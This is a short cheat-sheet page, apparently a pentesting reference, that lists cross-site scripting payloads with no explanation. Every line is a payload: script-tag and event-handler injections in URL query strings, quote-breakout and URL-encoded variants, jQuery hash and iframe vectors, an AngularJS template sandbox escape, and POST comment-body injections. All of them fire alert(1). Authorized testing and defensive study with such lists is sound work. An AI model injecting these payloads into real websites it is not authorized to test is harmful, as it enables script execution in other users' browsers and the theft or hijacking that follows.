---
title: XSS Cheat Sheet
desc: Cheet Sheet for Cross Site Scripting.
tags: [Web, XSS]
alts: []
website: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
render_with_liquid: false
---

```html
https://example.com/item?id=<script>alert(1)</script>
https://example.com/item?id="><script>alert(1)</script>
https://example.com/?search=<script>alert(1)</script>
https://example.com/?search="><script>alert(1)</script>
https://example.com/?search="><img src=1 onerror=alert(1)>
https://example.com/?search="><svg onload=alert(1)>
https://example.com/?search="></span><img src=1 onerror=alert(1)>
https://example.com/?search=javascript:alert(1)
https://example.com/?search=\"-alert(1)//
https://example.com/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

<!-- jQuery -->
https://example.com/#<img src=1 onerror=alert(1)>
<iframe src="https://vulnerable.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">

<!-- AngulaJS (<html ng-app>) -->
https://example.com/?search={{$on.constructor('alert(1)')()}}

<!-- POST request body -->
postId=2&comment=<script>alert(1)</script>
postId=2&comment=<><img src=1 onerror=alert(1)>
postId=2&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```